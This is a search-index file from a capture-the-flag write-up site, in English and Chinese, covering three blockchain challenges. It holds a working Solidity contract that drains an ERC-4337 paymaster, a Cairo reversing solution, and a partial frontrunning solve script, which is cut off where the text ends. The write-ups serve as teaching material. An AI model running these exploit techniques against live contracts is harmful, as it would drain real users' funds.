{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to Chictf-Writeups \u00b6 \ud83d\udc23 Recent Posts \u00b6 {{ blog_content }}","title":"\u9996\u9875"},{"location":"#welcome-to-chictf-writeups","text":"","title":"Welcome to Chictf-Writeups"},{"location":"#recent-posts","text":"{{ blog_content }}","title":"\ud83d\udc23 Recent Posts"},{"location":"how_to_participate/","text":"\u6587\u6863\u5f15\u7528\u4e0e\u5b58\u50a8\u683c\u5f0f \u00b6 \u6587\u4ef6\u540d \u8bf7\u52a1\u5fc5 \u5168\u90e8\u5c0f\u5199 \uff0c\u4ee5 _ \u5206\u5272\u3002 \u4f8b\u5982\uff1a file_name.md \u8bf7\u52a1\u5fc5\u786e\u4fdd\u6587\u6863\u4e2d\u5f15\u7528\u7684 \u5916\u94fe \u56fe\u7247\u5df2\u7ecf\u5168\u90e8\u8f6c\u5b58\u5230\u4e86 \u672c\u5e93\u5185 \u5bf9\u5e94\u7684 img \u6587\u4ef6\u5939\u4e2d\uff0c\u5efa\u8bae\u5904\u7406\u6210 MD \u6587\u6863\u540d\u79f0 + \u7f16\u53f7 \u7684\u5f62\u5f0f\uff08\u53ef\u53c2\u8003\u5df2\u6709\u6587\u6863\u4e2d\u56fe\u7247\u7684\u5904\u7406\u65b9\u5f0f\uff09\u3002\u4f8b\u5982\uff1a\u672c\u7bc7\u6587\u6863\u7684\u6587\u4ef6\u540d\u79f0\u4e3a format \uff0c\u5219\u6587\u6863\u4e2d\u5f15\u7528\u7684\u7b2c\u4e00\u5f20\u56fe\u7247\u7684\u540d\u5b57\u4e3a format01.jpg \u56fe\u7247\u683c\u5f0f\u63a8\u8350\u4f7f\u7528 JPEG \u6587\u6863\u57fa\u672c\u683c\u5f0f\u8981\u6c42 \u00b6 \u6587\u4ef6\u5143\u6570\u636e\u683c\u5f0f\uff0c\u53ef\u53c2\u8003\u5df2\u6709 Writeups 1 2 3 4 --- title: \u9898\u76ee\u6240\u5c5e\u5206\u7c7b - \u9898\u76ee\u540d\u79f0 description: \u6bd4\u8d5b\u5e74\u4efd | \u6bd4\u8d5b\u540d\u79f0 | \u9898\u76ee\u5206\u7c7b --- \u4e0d\u8981\u4f7f\u7528\u5982 <h1> \u6216\u8005 # \u6807\u9898 \u7684\u4e00\u7ea7\u6807\u9898 \u6d89\u53ca\u5230\u76ee\u5f55\u66f4\u6539\u65f6 \u9700\u8981\u6539\u52a8 mkdocs.yml","title":"\u5982\u4f55\u53c2\u4e0e"},{"location":"how_to_participate/#_1","text":"\u6587\u4ef6\u540d \u8bf7\u52a1\u5fc5 \u5168\u90e8\u5c0f\u5199 \uff0c\u4ee5 _ \u5206\u5272\u3002 \u4f8b\u5982\uff1a file_name.md \u8bf7\u52a1\u5fc5\u786e\u4fdd\u6587\u6863\u4e2d\u5f15\u7528\u7684 \u5916\u94fe \u56fe\u7247\u5df2\u7ecf\u5168\u90e8\u8f6c\u5b58\u5230\u4e86 \u672c\u5e93\u5185 \u5bf9\u5e94\u7684 img \u6587\u4ef6\u5939\u4e2d\uff0c\u5efa\u8bae\u5904\u7406\u6210 MD \u6587\u6863\u540d\u79f0 + \u7f16\u53f7 \u7684\u5f62\u5f0f\uff08\u53ef\u53c2\u8003\u5df2\u6709\u6587\u6863\u4e2d\u56fe\u7247\u7684\u5904\u7406\u65b9\u5f0f\uff09\u3002\u4f8b\u5982\uff1a\u672c\u7bc7\u6587\u6863\u7684\u6587\u4ef6\u540d\u79f0\u4e3a format \uff0c\u5219\u6587\u6863\u4e2d\u5f15\u7528\u7684\u7b2c\u4e00\u5f20\u56fe\u7247\u7684\u540d\u5b57\u4e3a format01.jpg \u56fe\u7247\u683c\u5f0f\u63a8\u8350\u4f7f\u7528 JPEG","title":"\u6587\u6863\u5f15\u7528\u4e0e\u5b58\u50a8\u683c\u5f0f"},{"location":"how_to_participate/#_2","text":"\u6587\u4ef6\u5143\u6570\u636e\u683c\u5f0f\uff0c\u53ef\u53c2\u8003\u5df2\u6709 Writeups 1 2 3 4 --- title: \u9898\u76ee\u6240\u5c5e\u5206\u7c7b - \u9898\u76ee\u540d\u79f0 description: \u6bd4\u8d5b\u5e74\u4efd | \u6bd4\u8d5b\u540d\u79f0 | \u9898\u76ee\u5206\u7c7b --- \u4e0d\u8981\u4f7f\u7528\u5982 <h1> \u6216\u8005 # \u6807\u9898 \u7684\u4e00\u7ea7\u6807\u9898 \u6d89\u53ca\u5230\u76ee\u5f55\u66f4\u6539\u65f6 \u9700\u8981\u6539\u52a8 mkdocs.yml","title":"\u6587\u6863\u57fa\u672c\u683c\u5f0f\u8981\u6c42"},{"location":"blockchain/404paymaster/","tags":["smart contract","account abstraction","uniswap v2"],"text":"#smart contract #account abstraction #uniswap v2 .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 Do you know what AA is? You should know that. 404paymaster.zip Solution \u00b6 The DN404 paymaster, which allows users to pay fees with DN404 tokens, has deposited 5 * 1e16 WETH into the entry point. To solve the challenge, we need to consume the paymaster's deposit to below 1e10 The entry point executes userOps by two loops: validation loop and execution loop 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 function handleOps ( UserOperation [] calldata ops , address payable beneficiary ) public nonReentrant { uint256 opslen = ops . length ; UserOpInfo [] memory opInfos = new UserOpInfo []( opslen ); unchecked { for ( uint256 i = 0 ; i < opslen ; i ++ ) { UserOpInfo memory opInfo = opInfos [ i ]; ( uint256 validationData , uint256 pmValidationData ) = _validatePrepayment ( i , ops [ i ], opInfo ); _validateAccountAndPaymasterValidationData ( i , validationData , pmValidationData , address ( 0 )); } uint256 collected = 0 ; emit BeforeExecution (); for ( uint256 i = 0 ; i < opslen ; i ++ ) { collected += _executeUserOp ( i , ops [ i ], opInfos [ i ]); } _compensate ( beneficiary , collected ); } //unchecked } During the validation loop, the required prefund fee is calculated based on arguments in userOps and deducted from the paymaster's deposit. Meanwhile, the paymaster will precharge DN404 tokens corresponding to 120% of the gas fee based on the cached price handleOps() will call postOp() on the paymaster after making the execution call. In the postOp() , the paymaster will refund tokens to users based on the actual gas cost and use the received tokens to refill the deposit Since DN404 tokens are charged at 120% of the fee, after normal execution, the paymaster's deposit will be higher than before execution. And the paymaster is using Uniswap V2 to swap DN404 tokens back to WETH. We may be able to manipulate the price by swapping, but the price cached in the paymaster obtains reserved data from the Uniswap V2 pair (i.e. flash loans won't work) and we hold too few tokens compared to the pair 1 2 3 4 5 6 7 8 9 function updateCachedPrice () public returns ( uint256 ) { // This function updates the cached ERC20/mockETH price ratio from pair ( address token0 ,) = sortTokens ( address ( token ), address ( mockWETH )); ( uint256 reserve0 , uint256 reserve1 ,) = IUniswapV2Pair ( pair ). getReserves (); ( uint256 reserveToken , uint256 reserveNative ) = address ( token ) == token0 ? ( reserve0 , reserve1 ) : ( reserve1 , reserve0 ); require ( reserveToken != 0 , \"reserveToken is zero\" ); return cachedPrice = reserveNative * PRICE_DENOMINATOR / reserveToken ; } If innerHandleOp() reverts due to postOp execution failure, the entry point will only roll back the current execution instead of the entire transaction and postOp() will be called again with postOpReverted mode. In this case, postOp() will do nothing, including refilling the deposit and refunding tokens. However, the storage that was changed during the validation loop will not be reverted and the entry point will be charged according to the gas consumed. Thus, the paymaster's deposit can be reduced 1 2 3 4 5 6 7 8 9 10 11 function _postOp ( PostOpMode mode , bytes calldata context , uint256 actualGasCost ) internal override { unchecked { ... if ( mode == PostOpMode . postOpReverted ) { emit PostOpReverted ( userOpSender , preCharge ); // Do nothing here to not revert the whole bundle and harm reputation return ; } ... } } Utilize the Uniswap V2 reentrancy lock to cause swap to fail is an easy way to let postOp() reverts Then, since the gas price is under control, to increase actualGasCost , we need to consider how to consume as much gas as possible in a userOp The actualGas calculation consists of two parts: the gas consumed by the execution and user-provided preVerificationGas . The preVerificationGas is the extra gas to pay the bundler and can be used to increase gas consumption greatly Exploitation \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 contract Hack { Challenge challenge ; constructor ( Challenge _challenge ) { challenge = _challenge ; } function exploit () external { address paymaster = challenge . paymaster (); address dn = challenge . _dn404 (); address weth = address ( IDN404Paymaster ( paymaster ). mockWETH ()); IUniswapV2Factory factory = IUniswapV2Factory ( challenge . uniV2factory ()); IUniswapV2Pair pair = IUniswapV2Pair ( factory . getPair ( dn , weth )); IEntryPoint entryPoint = IDN404Paymaster ( paymaster ). entryPoint (); challenge . register (); IERC20 ( dn ). approve ( paymaster , type ( uint256 ). max ); uint nonce ; uint mul = 1e10 ; while ( ! challenge . isSolved ()) { // swap to lock the pair pair . swap ( pair . token0 () == dn ? 1 : 0 , pair . token1 () == dn ? 1 : 0 , address ( this ), abi . encode ( nonce ++ , mul ) ); // the required prefund should not exceed the paymaster's deposit if ( entryPoint . balanceOf ( paymaster ) / 1e6 < mul ) { mul /= 10 ; } } } function uniswapV2Call ( address sender , uint , uint , bytes calldata data ) external { require ( sender == address ( this )); address paymaster = challenge . paymaster (); UserOperation [] memory ops = new UserOperation []( 1 ); ( uint nonce , uint mul ) = abi . decode ( data , ( uint , uint )); ops [ 0 ] = UserOperation ({ sender : address ( this ), nonce : nonce , initCode : new bytes ( 0 ), callData : new bytes ( 0 ), callGasLimit : 10000 , verificationGasLimit : 110000 , // The amount of gas to allocate for the verification step preVerificationGas : 640000 , maxFeePerGas : mul , maxPriorityFeePerGas : mul , paymasterAndData : abi . encodePacked ( paymaster ), signature : \"\" }); IEntryPoint entryPoint = IDN404Paymaster ( paymaster ). entryPoint (); entryPoint . handleOps ( ops , payable ( address ( this ))); IERC20 ( challenge . _dn404 ()). transfer ( msg . sender , 3 ); } function validateUserOp ( UserOperation calldata , bytes32 , uint256 ) external view returns ( uint256 validationData ) { validationData = block . timestamp << ( 48 + 160 ); // validAfter } } References \u00b6 ERC-4337: Account Abstraction Using Alt Mempool [M-01] Balance check during MagicSpend validation cannot ensure that MagicSpend has enough balance to cover the requested fund","title":"404Paymaster"},{"location":"blockchain/404paymaster/#description","text":"Do you know what AA is? You should know that. 404paymaster.zip","title":"Description"},{"location":"blockchain/404paymaster/#solution","text":"The DN404 paymaster, which allows users to pay fees with DN404 tokens, has deposited 5 * 1e16 WETH into the entry point. To solve the challenge, we need to consume the paymaster's deposit to below 1e10 The entry point executes userOps by two loops: validation loop and execution loop 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 function handleOps ( UserOperation [] calldata ops , address payable beneficiary ) public nonReentrant { uint256 opslen = ops . length ; UserOpInfo [] memory opInfos = new UserOpInfo []( opslen ); unchecked { for ( uint256 i = 0 ; i < opslen ; i ++ ) { UserOpInfo memory opInfo = opInfos [ i ]; ( uint256 validationData , uint256 pmValidationData ) = _validatePrepayment ( i , ops [ i ], opInfo ); _validateAccountAndPaymasterValidationData ( i , validationData , pmValidationData , address ( 0 )); } uint256 collected = 0 ; emit BeforeExecution (); for ( uint256 i = 0 ; i < opslen ; i ++ ) { collected += _executeUserOp ( i , ops [ i ], opInfos [ i ]); } _compensate ( beneficiary , collected ); } //unchecked } During the validation loop, the required prefund fee is calculated based on arguments in userOps and deducted from the paymaster's deposit. Meanwhile, the paymaster will precharge DN404 tokens corresponding to 120% of the gas fee based on the cached price handleOps() will call postOp() on the paymaster after making the execution call. In the postOp() , the paymaster will refund tokens to users based on the actual gas cost and use the received tokens to refill the deposit Since DN404 tokens are charged at 120% of the fee, after normal execution, the paymaster's deposit will be higher than before execution. And the paymaster is using Uniswap V2 to swap DN404 tokens back to WETH. We may be able to manipulate the price by swapping, but the price cached in the paymaster obtains reserved data from the Uniswap V2 pair (i.e. flash loans won't work) and we hold too few tokens compared to the pair 1 2 3 4 5 6 7 8 9 function updateCachedPrice () public returns ( uint256 ) { // This function updates the cached ERC20/mockETH price ratio from pair ( address token0 ,) = sortTokens ( address ( token ), address ( mockWETH )); ( uint256 reserve0 , uint256 reserve1 ,) = IUniswapV2Pair ( pair ). getReserves (); ( uint256 reserveToken , uint256 reserveNative ) = address ( token ) == token0 ? ( reserve0 , reserve1 ) : ( reserve1 , reserve0 ); require ( reserveToken != 0 , \"reserveToken is zero\" ); return cachedPrice = reserveNative * PRICE_DENOMINATOR / reserveToken ; } If innerHandleOp() reverts due to postOp execution failure, the entry point will only roll back the current execution instead of the entire transaction and postOp() will be called again with postOpReverted mode. In this case, postOp() will do nothing, including refilling the deposit and refunding tokens. However, the storage that was changed during the validation loop will not be reverted and the entry point will be charged according to the gas consumed. Thus, the paymaster's deposit can be reduced 1 2 3 4 5 6 7 8 9 10 11 function _postOp ( PostOpMode mode , bytes calldata context , uint256 actualGasCost ) internal override { unchecked { ... if ( mode == PostOpMode . postOpReverted ) { emit PostOpReverted ( userOpSender , preCharge ); // Do nothing here to not revert the whole bundle and harm reputation return ; } ... } } Utilize the Uniswap V2 reentrancy lock to cause swap to fail is an easy way to let postOp() reverts Then, since the gas price is under control, to increase actualGasCost , we need to consider how to consume as much gas as possible in a userOp The actualGas calculation consists of two parts: the gas consumed by the execution and user-provided preVerificationGas . The preVerificationGas is the extra gas to pay the bundler and can be used to increase gas consumption greatly","title":"Solution"},{"location":"blockchain/404paymaster/#exploitation","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 contract Hack { Challenge challenge ; constructor ( Challenge _challenge ) { challenge = _challenge ; } function exploit () external { address paymaster = challenge . paymaster (); address dn = challenge . _dn404 (); address weth = address ( IDN404Paymaster ( paymaster ). mockWETH ()); IUniswapV2Factory factory = IUniswapV2Factory ( challenge . uniV2factory ()); IUniswapV2Pair pair = IUniswapV2Pair ( factory . getPair ( dn , weth )); IEntryPoint entryPoint = IDN404Paymaster ( paymaster ). entryPoint (); challenge . register (); IERC20 ( dn ). approve ( paymaster , type ( uint256 ). max ); uint nonce ; uint mul = 1e10 ; while ( ! challenge . isSolved ()) { // swap to lock the pair pair . swap ( pair . token0 () == dn ? 1 : 0 , pair . token1 () == dn ? 1 : 0 , address ( this ), abi . encode ( nonce ++ , mul ) ); // the required prefund should not exceed the paymaster's deposit if ( entryPoint . balanceOf ( paymaster ) / 1e6 < mul ) { mul /= 10 ; } } } function uniswapV2Call ( address sender , uint , uint , bytes calldata data ) external { require ( sender == address ( this )); address paymaster = challenge . paymaster (); UserOperation [] memory ops = new UserOperation []( 1 ); ( uint nonce , uint mul ) = abi . decode ( data , ( uint , uint )); ops [ 0 ] = UserOperation ({ sender : address ( this ), nonce : nonce , initCode : new bytes ( 0 ), callData : new bytes ( 0 ), callGasLimit : 10000 , verificationGasLimit : 110000 , // The amount of gas to allocate for the verification step preVerificationGas : 640000 , maxFeePerGas : mul , maxPriorityFeePerGas : mul , paymasterAndData : abi . encodePacked ( paymaster ), signature : \"\" }); IEntryPoint entryPoint = IDN404Paymaster ( paymaster ). entryPoint (); entryPoint . handleOps ( ops , payable ( address ( this ))); IERC20 ( challenge . _dn404 ()). transfer ( msg . sender , 3 ); } function validateUserOp ( UserOperation calldata , bytes32 , uint256 ) external view returns ( uint256 validationData ) { validationData = block . timestamp << ( 48 + 160 ); // validAfter } }","title":"Exploitation"},{"location":"blockchain/404paymaster/#references","text":"ERC-4337: Account Abstraction Using Alt Mempool [M-01] Balance check during MagicSpend validation cannot ensure that MagicSpend has enough balance to cover the requested fund","title":"References"},{"location":"blockchain/cairo_reverse/","tags":["reverse"],"text":"#reverse .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 Simple cairo reverse starknet-compile 0.9.1 cairo_reverse.zip \u89e3\u9898\u601d\u8def \u00b6 get_flag \u9700\u8981\u77e5\u9053 t \u7684\u503c\uff0c\u8bd5\u56fe\u76f4\u63a5\u5728 contract_compiled.json \u627e t \u6765\u83b7\u5f97\u5bf9\u5e94\u503c\u65e0\u679c Cairo Playground \u53ef\u4ee5\u8fdb\u884c\u7f16\u8bd1\u8c03\u8bd5\uff0c\u53d1\u73b0 Memory \u90e8\u5206\u4e0e contract_compiled.json \u4e2d program \u7684 data \u90e8\u5206\u9ad8\u5ea6\u76f8\u4f3c \u66ff\u6362 CENSORED \u90e8\u5206\u4e3a\u4efb\u610f\u503c\uff0c\u4f7f\u7528 Playground \u8c03\u8bd5 get_flag \uff0c\u53ef\u77e5 0x800000000000010fffffffffffffffffffffffffffe2919e3d696087d12173e \u5bf9\u5e94 t \u7684\u8d1f\u503c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 %builtins output func get_flag{}(t:felt) -> (res : felt): if t == 1234: return (res=0x42414c534e7b6f032fa620b5c520ff47733c3723ebc79890c26af4 + t*t) else: return(res=0) end end func main{output_ptr : felt*}(): get_flag(4321) return () end Cairo \u4e2d\u6574\u578b\u7684\u8303\u56f4\u5728 \\([0, P)\\) \uff0c\u5176\u4e2d \\(P\\) \u4e3a\u7d20\u6570\uff0c\u6807\u51c6\u503c\u4e3a \\(2^{251}+17\\cdot 2^{192} + 1\\) 1 \u901a\u8fc7\u6a21 \\(P\\) \u6765\u6c42 t 1 2 3 4 5 6 7 >>> from Crypto.Util.number import long_to_bytes >>> base = 0x42414c534e7b6f032fa620b5c520ff47733c3723ebc79890c26af4 >>> P = 2 ** 251 + 17 * 2 ** 192 + 1 >>> mt = 0x800000000000010fffffffffffffffffffffffffffe2919e3d696087d12173e >>> t = - mt % P >>> long_to_bytes ( base + t * t ) b 'BALSN {read_data_from_cairo} ' \u5f53\u7136\u4e5f\u53ef\u4ee5\u4f7f\u7528 thoth \u6765 Decompile Flag \u00b6 BALSN{read_data_from_cairo} Introduction to Cairo \u2014 Field elements \u21a9","title":"Cairo Reverse"},{"location":"blockchain/cairo_reverse/#_1","text":"Simple cairo reverse starknet-compile 0.9.1 cairo_reverse.zip","title":"\u9898\u76ee"},{"location":"blockchain/cairo_reverse/#_2","text":"get_flag \u9700\u8981\u77e5\u9053 t \u7684\u503c\uff0c\u8bd5\u56fe\u76f4\u63a5\u5728 contract_compiled.json \u627e t \u6765\u83b7\u5f97\u5bf9\u5e94\u503c\u65e0\u679c Cairo Playground \u53ef\u4ee5\u8fdb\u884c\u7f16\u8bd1\u8c03\u8bd5\uff0c\u53d1\u73b0 Memory \u90e8\u5206\u4e0e contract_compiled.json \u4e2d program \u7684 data \u90e8\u5206\u9ad8\u5ea6\u76f8\u4f3c \u66ff\u6362 CENSORED \u90e8\u5206\u4e3a\u4efb\u610f\u503c\uff0c\u4f7f\u7528 Playground \u8c03\u8bd5 get_flag \uff0c\u53ef\u77e5 0x800000000000010fffffffffffffffffffffffffffe2919e3d696087d12173e \u5bf9\u5e94 t \u7684\u8d1f\u503c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 %builtins output func get_flag{}(t:felt) -> (res : felt): if t == 1234: return (res=0x42414c534e7b6f032fa620b5c520ff47733c3723ebc79890c26af4 + t*t) else: return(res=0) end end func main{output_ptr : felt*}(): get_flag(4321) return () end Cairo \u4e2d\u6574\u578b\u7684\u8303\u56f4\u5728 \\([0, P)\\) \uff0c\u5176\u4e2d \\(P\\) \u4e3a\u7d20\u6570\uff0c\u6807\u51c6\u503c\u4e3a \\(2^{251}+17\\cdot 2^{192} + 1\\) 1 \u901a\u8fc7\u6a21 \\(P\\) \u6765\u6c42 t 1 2 3 4 5 6 7 >>> from Crypto.Util.number import long_to_bytes >>> base = 0x42414c534e7b6f032fa620b5c520ff47733c3723ebc79890c26af4 >>> P = 2 ** 251 + 17 * 2 ** 192 + 1 >>> mt = 0x800000000000010fffffffffffffffffffffffffffe2919e3d696087d12173e >>> t = - mt % P >>> long_to_bytes ( base + t * t ) b 'BALSN {read_data_from_cairo} ' \u5f53\u7136\u4e5f\u53ef\u4ee5\u4f7f\u7528 thoth \u6765 Decompile","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/cairo_reverse/#flag","text":"BALSN{read_data_from_cairo} Introduction to Cairo \u2014 Field elements \u21a9","title":"Flag"},{"location":"blockchain/claim_guard/","tags":["mev","frontrun","rust","transaction order"],"text":"#mev #frontrun #rust #transaction order .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 We got a cheater. nc claim-guard.wm-team.cn 1337 claim_guard.zip \u89e3\u9898\u601d\u8def \u00b6 \u5408\u7ea6 Chall \u5171\u6709\u4e09\u4e2a\u51fd\u6570\uff1a registerBlock() \u3001 proveWork() \u548c claimLastWinner() \u3002\u9898\u76ee\u8981\u6c42 player \uff0c\u5373\u7ed9\u5b9a\u7684 EOA\uff0c\u6210\u4e3a lastWinner \u3002\u9700\u8981 player \u5728\u540c\u4e00\u4e2a\u5757\u5185\u4f9d\u6b21\u8c03\u7528\u4e09\u4e2a\u51fd\u6570\u5e76\u63d0\u4f9b\u6b63\u786e\u7684\u5de5\u4f5c\u8bc1\u660e blockNonce \u8bb0\u5f55\u6bcf\u4e2a\u533a\u5757\u4e2d proveWork() \u6210\u529f\u6267\u884c\u7684\u6b21\u6570\u3002\u53ea\u6709\u7b2c\u4e00\u4e2a\u6210\u529f\u6267\u884c proveWork() \u7684\u8d26\u6237\u80fd\u591f\u8c03\u7528 claimLastWinner() \u6210\u4e3a lastWinner \u9898\u76ee\u73af\u5883\u4e2d\u5305\u542b\u4e00\u4e2a bot\uff0c\u4f1a\u5728\u6bcf\u4e2a\u533a\u5757\u8c03\u7528 registerBlock() \uff0c\u5e76\u76d1\u542c mempool\u3002\u5982\u679c\u51fa\u73b0\u80fd\u591f\u6210\u529f\u6267\u884c proveWork() \u7684\u4ea4\u6613\uff0cbot \u5c06\u4f7f\u7528\u66f4\u9ad8\u7684 gas price \u8bd5\u56fe\u62a2\u8dd1\u5bf9\u5e94\u4ea4\u6613 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // 0x27d4563e let sig : [ u8 ; 4 ] = [ 0x27 , 0xd4 , 0x56 , 0x3e ]; // concat sig and pow let mut data = Vec :: with_capacity ( 4 + 32 ); data . extend_from_slice ( & sig ); data . extend_from_slice ( pow . as_slice ()); let bytes = Bytes :: from ( data ); let bn = finalized_block . header . number . unwrap (); let nonce = * self . nonce_map . get ( & bn ). unwrap (); let effective_gas_price = tx . gas_price . or ( tx . max_fee_per_gas ). unwrap_or_default (); let chain_id = self . provider . get_chain_id (). await . unwrap (); let tx_receipt = TransactionRequest { from : Some ( self . sender_addr ), to : Some ( TxKind :: Call ( self . chall_addr )), gas_price : Some ( effective_gas_price * 2 ), gas : Some ( 100_0000 ), input : TransactionInput :: new ( bytes ), chain_id : Some ( chain_id ), nonce : Some ( nonce ), .. Default :: default () }; \u4e0e proveWork() \u4e0d\u540c\uff0cbot \u53d1\u9001\u7684 registerBlock() \u4ea4\u6613\u7684 gas price \u662f\u56fa\u5b9a\u7684 1 2 3 4 5 6 7 8 9 10 11 // register the block let tx_receipt = TransactionRequest { from : Some ( self . sender_addr ), to : Some ( TxKind :: Call ( self . chall_addr )), gas_price : Some ( 110000000000000000 / 100_0000 ), gas : Some ( 100_0000 ), chain_id : Some ( self . provider . get_chain_id (). await . unwrap ()), nonce : Some ( nonce ), input : hex :: decode ( \"0xccac0007\" ). unwrap (). into (), .. Default :: default () }; Anvil \u9ed8\u8ba4\u6309\u7167 gas price \u4ece\u9ad8\u5230\u4f4e\u5bf9\u4ea4\u6613\u8fdb\u884c\u6392\u5e8f 1 \uff0c\u540c\u65f6\u9700\u8981\u4fdd\u8bc1\u6bcf\u4e2a\u8d26\u6237\u7684\u4ea4\u6613\u7684 nonce \u662f\u6709\u6548\u7684\u3002\u5728\u5b9e\u73b0\u4e2d\u91c7\u7528\u5bf9\u72ec\u7acb\u4ea4\u6613\u4ee5 gas price \u548c FIFO (ready ID) \u4f18\u5148\u6392\u5e8f\u7684\u65b9\u5f0f\u3002\u5176\u4e2d\uff0c\u72ec\u7acb\u4ea4\u6613\u4e0d\u4f9d\u8d56\u5176\u5b83\u4ea4\u6613\uff0c\u5373 nonce \u6709\u6548\u53ef\u4ee5\u7acb\u5373\u6267\u884c\u3002\u975e\u72ec\u7acb\u4ea4\u6613\u5c06\u5728\u524d\u7f6e\u4ea4\u6613\u6267\u884c\u540e\u89e3\u9501\u5e76\u52a0\u5165\u5230\u72ec\u7acb\u4ea4\u6613\u96c6\u5408\u4e2d TransactionsIterator 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 impl TransactionsIterator { /// Depending on number of satisfied requirements insert given ref /// either to awaiting set or to best set. fn independent_or_awaiting ( & mut self , satisfied : usize , tx_ref : PoolTransactionRef ) { if satisfied >= tx_ref . transaction . requires . len () { // If we have satisfied all deps insert to best self . independent . insert ( tx_ref ); } else { // otherwise we're still awaiting for some deps self . awaiting . insert ( tx_ref . transaction . hash (), ( satisfied , tx_ref )); } } } impl Iterator for TransactionsIterator { type Item = Arc < PoolTransaction > ; fn next ( & mut self ) -> Option < Self :: Item > { loop { let best = self . independent . iter (). next_back () ? . clone (); let best = self . independent . take ( & best ) ? ; let hash = best . transaction . hash (); let ready = if let Some ( ready ) = self . all . get ( & hash ). cloned () { ready } else { continue }; // Insert transactions that just got unlocked. for hash in & ready . unlocks { // first check local awaiting transactions let res = if let Some (( mut satisfied , tx_ref )) = self . awaiting . remove ( hash ) { satisfied += 1 ; Some (( satisfied , tx_ref )) // then get from the pool } else { self . all . get ( hash ) . map ( | next | ( next . requires_offset + 1 , next . transaction . clone ())) }; if let Some (( satisfied , tx_ref )) = res { self . independent_or_awaiting ( satisfied , tx_ref ) } } return Some ( best . transaction ) } } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 /// transactions that are ready to be included in a block. #[derive(Clone, Debug, Default)] pub struct ReadyTransactions { .. . /// independent transactions that can be included directly and don't require other transactions /// Sorted by their id independent_transactions : BTreeSet < PoolTransactionRef > , } .. . impl Ord for PoolTransactionRef { fn cmp ( & self , other : & Self ) -> Ordering { self . transaction . priority . cmp ( & other . transaction . priority ) . then_with ( || other . id . cmp ( & self . id )) } } \u6839\u636e nonce \u548c\u9898\u76ee\u7ea6\u675f\uff0c proveWork() \u53ea\u80fd\u5728 registerBlock() \u4e4b\u540e\u6267\u884c\uff0c\u56e0\u6b64\u53ea\u9700\u8981 player \u4ee5\u66f4\u9ad8\u7684 gas price \u62a2\u8dd1 bot \u7684 registerBlock() \u4ea4\u6613\u5e76\u5b8c\u6210 proveWork() \u5373\u53ef \u53e6\u5916\uff0c\u7531\u4e8e\u533a\u5757\u7684\u4f7f\u7528\u7387\u51e0\u4e4e\u603b\u662f\u4e0d\u5230 50%\uff0c\u56e0\u6b64 base fee \u4f1a\u9010\u533a\u5757\u51cf\u5c11\uff0c\u53ef\u4ee5\u4ee5\u6b64\u6765\u533a\u5206\u6a21\u62df\u6267\u884c\u548c\u5b9e\u9645\u6267\u884c\uff0c\u8bbe\u7f6e\u5c0f\u4e8e\u5f53\u524d base fee \u800c\u5927\u4e8e\u4e0b\u4e00\u533a\u5757 base fee \u7684 gas price\uff0c\u4ece\u800c\u963b\u6b62 bot \u53d1\u9001 proveWork() \u4ea4\u6613 \u89e3\u9898\u811a\u672c \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 from web3 import Web3 from cheb3 import Connection from cheb3.utils import encode_with_signature import time , pwn ticket = b \"<ticket>\" HOST = \"claim-guard.wm-team.cn\" PORT = 1337 p = pwn . remote ( HOST , PORT ) p . sendlineafter ( b \"ticket\" , ticket ) p . sendlineafter ( b \"action?\" , b \"1\" ) p . recvuntil ( b \"rpc endpoints\" ) rpc = p . recvline_contains ( b \"-\" ) . decode () . split ( \" \" )[ - 1 ] conn = Connection ( rpc ) priv = p . recvline_contains ( b \"private key\" ) . decode () . split ( \" \" )[ - 1 ] account = conn . account ( priv ) setup = p . recvline_contains ( b \"contract:\" ) . decode () . split ( \" \" )[ - 1 ] p . close () chall = conn . cast_call ( setup , \"chall()(address)\" ) pow = 0 bn = conn . w3 . eth . get_block_number () + 2 while True : h = Web3 . solidity_keccak ([ 'uint256' , 'uint256' ], [ pow , bn ]) . hex () if int ( h , 16 ) >> 0xf0 == 0 : print ( \"Pow:\" , pow ) break pow += 1 print ( \"Waiting for block\" , bn ) current_bn = conn . w3 . eth . get_block_number () + 1 while bn > current_bn : time . sleep ( 0.5 ) current_bn = conn . w3 . eth . get_block_number () + 1 print ( 